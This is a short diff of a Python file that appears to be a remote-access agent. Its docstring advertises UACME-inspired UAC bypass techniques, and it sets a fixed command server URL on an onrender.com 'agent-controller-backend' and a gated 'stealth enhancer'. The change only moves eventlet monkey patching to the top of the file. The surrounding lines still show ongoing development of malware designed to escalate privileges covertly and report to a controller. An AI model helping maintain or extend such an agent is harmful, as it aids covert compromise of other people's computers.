@@ -1,3 +1,18 @@
+# Fix eventlet RLock warning - MUST BE FIRST IMPORT BEFORE ANYTHING ELSE
+# This MUST be at the very top to prevent "RLock was not greened" warning
+try:
+    import eventlet
+    # Comprehensive monkey patching - fixes RLock issues with Python 3.13+
+    eventlet.monkey_patch(all=True, thread=True, time=True, os=True, socket=True, select=True, ssl=True)
+    EVENTLET_PATCHED = True
+except ImportError:
+    # eventlet not installed - will use standard threading
+    EVENTLET_PATCHED = False
+except Exception as e:
+    # Any other error during patching
+    print(f"Warning: eventlet monkey_patch failed: {e}")
+    EVENTLET_PATCHED = False
+
 #CREATED BY SPHINX
 """
 Advanced Python Agent with UACME-Inspired UAC Bypass Techniques
@@ -89,21 +104,8 @@ RUN_MODE = 'agent'  # Track run mode: 'agent' | 'controller' | 'both'
 USE_FIXED_SERVER_URL = True
 FIXED_SERVER_URL = os.environ.get('FIXED_SERVER_URL', 'https://agent-controller-backend.onrender.com')
 
-# Fix eventlet issue by patching BEFORE any other imports
-try:
-    import eventlet
-    # More comprehensive monkey patching to fix RLock issues
-    eventlet.monkey_patch(all=True, thread=True, time=True)
-    
-    # Additional fix for RLock greening issues in newer Python versions
-    import threading
-    if hasattr(threading, '_RLock'):
-        threading._RLock = eventlet.green.threading.RLock
-    if hasattr(threading, 'RLock'):
-        threading.RLock = eventlet.green.threading.RLock
-        
-except ImportError:
-    pass  # eventlet not available, continue without it
+# Eventlet is now patched at the very top of the file (line 1-2)
+# This section is kept for compatibility but monkey_patch is already done
 
 # Stealth enhancer integration (gated)
 try:
